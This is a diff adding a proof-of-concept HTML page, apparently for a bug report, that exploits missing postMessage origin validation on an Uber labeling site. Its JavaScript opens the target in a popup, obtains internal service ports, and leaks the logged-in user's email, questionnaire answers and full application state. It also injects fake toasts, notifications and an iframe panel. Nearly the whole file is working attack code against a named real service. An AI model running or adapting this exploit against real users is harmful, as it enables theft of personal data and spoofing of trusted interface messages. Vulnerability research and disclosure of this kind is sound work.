@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Uber Label PostMessage Exploit PoC</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        .header h1 { font-size: 28px; margin-bottom: 10px; }
+        .header p { opacity: 0.9; font-size: 14px; }
+        .content { padding: 30px; }
+        .step {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #667eea;
+        }
+        .step h3 { color: #333; margin-bottom: 15px; display: flex; align-items: center; }
+        .step-number {
+            background: #667eea;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 5px;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .status {
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-weight: 500;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        .log {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 15px;
+            border-radius: 8px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            margin-top: 15px;
+        }
+        .log-entry { margin: 5px 0; }
+        .log-success { color: #4ec9b0; }
+        .log-error { color: #f48771; }
+        .log-info { color: #569cd6; }
+        .log-data { color: #ce9178; }
+        .leaked-data {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+        .leaked-data h4 { color: #856404; margin-bottom: 10px; }
+        .leaked-data pre {
+            background: white;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Uber Label PostMessage Exploit</h1>
+            <p>Proof of Concept - Missing Origin Validation</p>
+        </div>
+
+        <div class="content">
+            <div class="step">
+                <h3><span class="step-number">1</span>Open Target Window</h3>
+                <p>First, open the Uber Label page in a new window</p>
+                <button onclick="openTarget()">Open Target Window</button>
+                <div id="status1"></div>
+            </div>
+
+            <div class="step">
+                <h3><span class="step-number">2</span>Discover Services</h3>
+                <p>Connect to service-discovery and list all available services</p>
+                <button onclick="discoverServices()" id="btnDiscover" disabled>Discover Services</button>
+                <div id="status2"></div>
+                <div id="services"></div>
+            </div>
+
+            <div class="step">
+                <h3><span class="step-number">3</span>Exploit Services</h3>
+                <p>Test various attack vectors</p>
+                <button onclick="leakUserInfo()" id="btnLeak" disabled>Leak User Email</button>
+                <button onclick="createToast()" id="btnToast" disabled>Create Toast Message</button>
+                <button onclick="createNotification()" id="btnNotif" disabled>Create Notification</button>
+                <button onclick="testIframeInjection()" id="btn2" disabled>Test Iframe Injection</button>
+                <button onclick="testQuestionnaireLeaks()" id="btnQuestionnaire" disabled>Test Questionnaire Methods</button>
+                <div id="status3"></div>
+            </div>
+
+            <div id="logContainer" style="display: none;">
+                <h3>Console Log</h3>
+                <div id="log" class="log"></div>
+            </div>
+
+            <div id="leakedData" style="display: none;" class="leaked-data">
+                <h4>Leaked User Information</h4>
+                <pre id="dataDisplay"></pre>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let targetWindow = null;
+        let serviceDiscoveryPort = null;
+        let providers = [];
+
+        function log(message, type = 'info') {
+            const logDiv = document.getElementById('log');
+            const logContainer = document.getElementById('logContainer');
+            logContainer.style.display = 'block';
+
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+            console.log(message);
+        }
+
+        function setStatus(elementId, message, type = 'info') {
+            const el = document.getElementById(elementId);
+            el.innerHTML = `<div class="status ${type}">${message}</div>`;
+        }
+
+        function generateRequestID() {
+            return Math.random().toString(36).substring(2) + Date.now().toString(36);
+        }
+
+        function openTarget() {
+            log('Opening target window...', 'info');
+            targetWindow = window.open('https://ulabel.uber.com', 'uber_target', 'width=1200,height=800');
+
+            if (!targetWindow) {
+                setStatus('status1', '❌ Failed to open window. Please allow popups!', 'error');
+                log('Failed to open target window', 'error');
+                return;
+            }
+
+            setStatus('status1', '✅ Target window opened! Wait 3 seconds, then click "Discover Services"', 'success');
+            log('Target window opened successfully', 'success');
+
+            setTimeout(() => {
+                document.getElementById('btnDiscover').disabled = false;
+            }, 3000);
+        }
+
+        async function discoverServices() {
+            log('Starting service discovery...', 'info');
+            setStatus('status2', '🔄 Connecting to service-discovery...', 'info');
+
+            try {
+                serviceDiscoveryPort = await connectToServiceDiscovery();
+                log('Connected to service-discovery', 'success');
+
+                providers = await listProviders();
+                log(`Found ${providers.length} service providers`, 'success');
+
+                let servicesHTML = '<div style="margin-top: 10px; font-size: 12px;">';
+                servicesHTML += '<strong>Available Services:</strong><br>';
+                providers.forEach((p, i) => {
+                    servicesHTML += `${i + 1}. ${p.type} (${p.methodsList.length} methods)<br>`;
+                });
+                servicesHTML += '</div>';
+                document.getElementById('services').innerHTML = servicesHTML;
+
+                setStatus('status2', `✅ Discovery complete! Found ${providers.length} services`, 'success');
+
+                document.getElementById('btnLeak').disabled = false;
+                document.getElementById('btnToast').disabled = false;
+                document.getElementById('btnNotif').disabled = false;
+                document.getElementById('btn2').disabled = false;
+                document.getElementById('btnQuestionnaire').disabled = false;
+
+            } catch (err) {
+                setStatus('status2', `Error: ${err}`, 'error');
+                log(`Discovery failed: ${err}`, 'error');
+            }
+        }
+
+        function connectToServiceDiscovery() {
+            return new Promise((resolve, reject) => {
+                const requestID = generateRequestID();
+
+                const handler = (event) => {
+                    if (event.data && event.data.type === 'REQUEST_CLIENT_PORT_RESPONSE' && event.data.requestID === requestID) {
+                        if (event.ports && event.ports[0]) {
+                            const port = event.ports[0];
+                            port.start();
+                            window.removeEventListener('message', handler);
+                            resolve(port);
+                        } else {
+                            reject('No port received');
+                        }
+                    }
+                };
+
+                window.addEventListener('message', handler);
+
+                targetWindow.postMessage({
+                    requestID: requestID,
+                    type: 'REQUEST_CLIENT_PORT',
+                    channel: 'service-discovery',
+                    portIndex: 'port2'
+                }, '*');
+
+                setTimeout(() => {
+                    window.removeEventListener('message', handler);
+                    reject('Timeout');
+                }, 5000);
+            });
+        }
+
+        function listProviders() {
+            return new Promise((resolve) => {
+                const requestID = generateRequestID();
+
+                const handler = (msg) => {
+                    if (msg.data.requestID === requestID) {
+                        serviceDiscoveryPort.removeEventListener('message', handler);
+                        resolve(msg.data.payload || []);
+                    }
+                };
+
+                serviceDiscoveryPort.addEventListener('message', handler);
+
+                serviceDiscoveryPort.postMessage({
+                    requestID: requestID,
+                    type: 'LIST_PROVIDERS',
+                    payload: {}
+                });
+            });
+        }
+                async function testIframeInjection() {
+            log('🔄 Testing iframe injection...', 'warn');
+
+            const reqID = Math.random().toString(36).substring(2);
+
+            window.addEventListener('message', (event) => {
+                if (event.data?.type === 'REQUEST_CLIENT_PORT_RESPONSE' && event.data.requestID === reqID) {
+                    if (event.ports?.[0]) {
+                        const discoveryPort = event.ports[0];
+                        discoveryPort.start();
+
+                        discoveryPort.postMessage({
+                            requestID: Math.random().toString(36).substring(2),
+                            type: 'LIST_PROVIDERS',
+                            payload: {}
+                        });
+
+                        discoveryPort.addEventListener('message', async (msg) => {
+                            if (msg.data.payload) {
+                                const providers = msg.data.payload;
+                                const instructionsPanel = providers.find(p => p.type === 'instructions-panel');
+
+                                if (instructionsPanel) {
+                                    log('✅ Found instructions-panel service', 'success');
+                                    await testOpenPanel(instructionsPanel);
+                                } else {
+                                    log('❌ instructions-panel service not found', 'error');
+                                }
+                            }
+                        });
+                    }
+                }
+            });
+
+            targetWindow.postMessage({
+                requestID: reqID,
+                type: 'REQUEST_CLIENT_PORT',
+                channel: 'service-discovery',
+                portIndex: 'port2'
+            }, '*');
+        }
+
+        async function testOpenPanel(service) {
+            return new Promise((resolve) => {
+                log('Testing openPanel with malicious URL...', 'warn');
+
+                const reqID = Math.random().toString(36).substring(2);
+
+                window.addEventListener('message', (event) => {
+                    if (event.data?.type === 'REQUEST_CLIENT_PORT_RESPONSE' && event.data.requestID === reqID) {
+                        if (event.ports?.[0]) {
+                            const port = event.ports[0];
+                            port.start();
+
+                            port.addEventListener('message', (msg) => {
+                                log(`Response: ${JSON.stringify(msg.data)}`, 'success');
+                            });
+
+                            // Test 1: Try to load attacker website
+                            log('Test 1: Loading https://example.com (safe test)', 'warn');
+                            port.postMessage({
+                                requestID: Math.random().toString(36).substring(2),
+                                type: 'openPanel',
+                                payload: [
+                                    'test-job-123',
+                                    JSON.stringify({
+                                        url: 'https://example.com',
+                                        version: '1.0',
+                                        isDisplay: true,
+                                        isAcknowledged: true,
+                                        name: 'Test Instruction'
+                                    }),
+                                    { title: 'Injected Panel', width: '100%', height: '100%' },
+                                    { width: '90%', height: '90%' }
+                                ]
+                            });
+
+                            log('📤 Sent openPanel - Check target window for iframe!', 'success');
+                            log('⚠️ If you see example.com loaded, iframe injection works!', 'warn');
+
+                            setTimeout(() => resolve(), 2000);
+                        }
+                    }
+                });
+
+                targetWindow.postMessage({
+                    requestID: reqID,
+                    type: 'REQUEST_CLIENT_PORT',
+                    channel: service.channelName,
+                    portIndex: 'port2'
+                }, '*');
+            });
+        }
+
+        async function leakUserInfo() {
+            log('Attempting to leak user information...', 'info');
+            setStatus('status3', ' Leaking user data...', 'info');
+
+            try {
+                const utaskService = providers.find(p => p.type === 'f7-utask');
+                if (!utaskService) {
+                    throw new Error('f7-utask service not found');
+                }
+
+                const requestID = generateRequestID();
+
+                const handler = (event) => {
+                    if (event.data && event.data.type === 'REQUEST_CLIENT_PORT_RESPONSE' && event.data.requestID === requestID) {
+                        if (event.ports && event.ports[0]) {
+                            const port = event.ports[0];
+                            port.start();
+
+                            port.addEventListener('message', (msg) => {
+                                if (msg.data.payload) {
+                                    log('User data leaked successfully!', 'success');
+
+                                    const data = msg.data.payload;
+                                    document.getElementById('leakedData').style.display = 'block';
+                                    document.getElementById('dataDisplay').textContent = JSON.stringify(data, null, 2);
+
+                                    setStatus('status3', `✅ Leaked: ${data.userEmail} (${data.userAlias})`, 'success');
+                                }
+                            });
+
+                            port.postMessage({
+                                requestID: generateRequestID(),
+                                type: 'getConfig',
+                                payload: []
+                            });
+                        }
+                    }
+                };
+
+                window.addEventListener('message', handler);
+
+                targetWindow.postMessage({
+                    requestID: requestID,
+                    type: 'REQUEST_CLIENT_PORT',
+                    channel: utaskService.channelName,
+                    portIndex: 'port2'
+                }, '*');
+
+            } catch (err) {
+                log(`Leak failed: ${err}`, 'error');
+                setStatus('status3', `Error: ${err}`, 'error');
+            }
+        }
+
+        async function createToast() {
+            log('Creating toast notification...', 'info');
+            setStatus('status3', '🔄 Creating toast...', 'info');
+
+            try {
+                const uxService = providers.find(p => p.type === 'f7-ux');
+                if (!uxService) {
+                    throw new Error('f7-ux service not found');
+                }
+
+                const requestID = generateRequestID();
+
+                const handler = (event) => {
+                    if (event.data && event.data.type === 'REQUEST_CLIENT_PORT_RESPONSE' && event.data.requestID === requestID) {
+                        if (event.ports && event.ports[0]) {
+                            const port = event.ports[0];
+                            port.start();
+
+                            port.addEventListener('message', (msg) => {
+                                log('Toast response: ' + JSON.stringify(msg.data), 'data');
+                            });
+
+                            port.postMessage({
+                                requestID: generateRequestID(),
+                                type: 'createToast',
+                                payload: [{
+                                    title: 'Security Alert',
+                                    content: 'Hello im toasts',
+                                    type: 'warning',
+                                    timeout: 10000,
+                                    closeable: true
+                                }]
+                            });
+
+                            setStatus('status3', ' Toast created! Check the target window for the warning message', 'success');
+                            log('Toast notification sent', 'success');
+                        }
+                    }
+                };
+
+                window.addEventListener('message', handler);
+
+                targetWindow.postMessage({
+                    requestID: requestID,
+                    type: 'REQUEST_CLIENT_PORT',
+                    channel: uxService.channelName,
+                    portIndex: 'port2'
+                }, '*');
+
+            } catch (err) {
+                log(`Toast failed: ${err}`, 'error');
+                setStatus('status3', ` Error: ${err}`, 'error');
+            }
+        }
+
+        async function createNotification() {
+            log('Creating notification...', 'info');
+            setStatus('status3', ' Creating notification...', 'info');
+
+            try {
+                const coreUxService = providers.find(p => p.type === 'f7-core-ux');
+                if (!coreUxService) {
+                    throw new Error('f7-core-ux service not found');
+                }
+
+                const requestID = generateRequestID();
+
+                const handler = (event) => {
+                    if (event.data && event.data.type === 'REQUEST_CLIENT_PORT_RESPONSE' && event.data.requestID === requestID) {
+                        if (event.ports && event.ports[0]) {
+                            const port = event.ports[0];
+                            port.start();
+
+                            port.addEventListener('message', (msg) => {
+                                log('Notification response: ' + JSON.stringify(msg.data), 'data');
+                            });
+
+                            port.postMessage({
+                                requestID: generateRequestID(),
+                                type: 'createNotification',
+                                payload: [{
+                                    level: 'info',
+                                    priority: 'timely',
+                                    title: 'Injected Notification',
+                                    content: 'This notification was created by an external attacker!',
+                                    persistent: true,
+                                    duration: 10000
+                                    
+                                }]
+                            });
+
+                            setStatus('status3', '✅ Notification created! Check the target window', 'success');
+                            log('Notification sent', 'success');
+                        }
+                    }
+                };
+
+                window.addEventListener('message', handler);
+
+                targetWindow.postMessage({
+                    requestID: requestID,
+                    type: 'REQUEST_CLIENT_PORT',
+                    channel: coreUxService.channelName,
+                    portIndex: 'port2'
+                }, '*');
+
+            } catch (err) {
+                log(`Notification failed: ${err}`, 'error');
+                setStatus('status3', ` Error: ${err}`, 'error');
+            }
+        }
+
+        async function testQuestionnaireLeaks() {
+            log('Testing questionnaire data leaks...', 'info');
+            setStatus('status3', '🔄 Testing questionnaire methods...', 'info');
+
+            try {
+                const questionnaireService = providers.find(p => p.type === 'utask-questionnaire');
+                if (!questionnaireService) {
+                    throw new Error('utask-questionnaire service not found');
+                }
+
+                const requestID = generateRequestID();
+
+                const handler = (event) => {
+                    if (event.data && event.data.type === 'REQUEST_CLIENT_PORT_RESPONSE' && event.data.requestID === requestID) {
+                        if (event.ports && event.ports[0]) {
+                            const port = event.ports[0];
+                            port.start();
+
+                            port.addEventListener('message', (msg) => {
+                                log('Questionnaire response: ' + JSON.stringify(msg.data), 'data');
+
+                                if (msg.data.payload && msg.data.payload !== null) {
+                                    log('✅ GOT QUESTIONNAIRE DATA!', 'success');
+                                    setStatus('status3', '✅ Leaked questionnaire data! Check log', 'success');
+                                } else {
+                                    log('ℹ️ No active task data (would leak if user had active tasks)', 'info');
+                                }
+                            });
+
+                            // Test multiple questionnaire methods
+                            log('Testing getCurrentResults()...', 'info');
+                            port.postMessage({
+                                requestID: generateRequestID(),
+                                type: 'getCurrentResults',
+                                payload: []
+                            });
+
+                            setTimeout(() => {
+                                log('Testing getAnswersHistory()...', 'info');
+                                port.postMessage({
+                                    requestID: generateRequestID(),
+                                    type: 'getAnswersHistory',
+                                    payload: []
+                                });
+                            }, 1000);
+
+                            setTimeout(() => {
+                                log('Testing getTaskQnaState()...', 'info');
+                                port.postMessage({
+                                    requestID: generateRequestID(),
+                                    type: 'getTaskQnaState',
+                                    payload: []
+                                });
+                            }, 2000);
+
+                            setTimeout(() => {
+                                log('Testing getState() - dumps entire Redux store...', 'info');
+                                port.postMessage({
+                                    requestID: generateRequestID(),
+                                    type: 'getState',
+                                    payload: []
+                                });
+                            }, 3000);
+
+                            setStatus('status3', '📤 Sent questionnaire method calls - check log', 'info');
+                        }
+                    }
+                };
+
+                window.addEventListener('message', handler);
+
+                targetWindow.postMessage({
+                    requestID: requestID,
+                    type: 'REQUEST_CLIENT_PORT',
+                    channel: questionnaireService.channelName,
+                    portIndex: 'port2'
+                }, '*');
+
+            } catch (err) {
+                log(`Questionnaire test failed: ${err}`, 'error');
+                setStatus('status3', `Error: ${err}`, 'error');
+            }
+        }
+    </script>
+</body>
+</html>
